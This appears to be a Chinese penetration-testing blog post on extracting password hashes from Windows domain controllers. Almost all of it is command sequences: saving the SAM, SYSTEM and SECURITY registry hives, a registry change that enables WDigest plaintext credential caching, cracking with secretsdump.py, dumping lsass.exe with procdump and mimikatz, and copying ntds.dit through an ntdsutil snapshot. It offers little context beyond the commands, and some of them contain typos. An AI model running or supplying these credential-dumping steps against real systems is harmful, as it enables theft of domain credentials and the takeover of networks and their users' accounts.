---
title: 离线提取域控HASH的方法
comments: true
date: 2022-02-08 11:53:07
tags: ["渗透测试", "提取hash"]
categories:
- 渗透测试
cover:
top_img:
description:
---



## 1.注册表提取

提取文件，Windows Server 2003或者Win XP 及以前需要提升到system权限，以后只要Administrator权限即可。

```verilog
reg save hklm\sam sam.hive
reg save hklm\system system.hive
reg save hklm\security secruity.hive
```





本地获取：

```dockerfile
# 如果要提取明文，请修改注册表
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

# 破解hash
python ./secretsdump.py -sam ~/Desktop/sam.hive  -security ~/Desktop/security.hive -system ~/Desktop/system.hive  LOCAL
```



## 2.lsass.exe提取

```bash
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz#privilege::debug
mimikatz#sekurlsa::minidump lsass.dmp
mimikatz#sekrulsa::logonpasswords full  

```









## 3.ntds.dit提取

```bash
ntdsutil snapshot "activate instance ntds" create quit quit
ntdsutil snapshot "mount {GUID}" quit quit
copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit
ntdsutil snapshot "unmount {GUID}" "delete {GUID}" quit quit

```













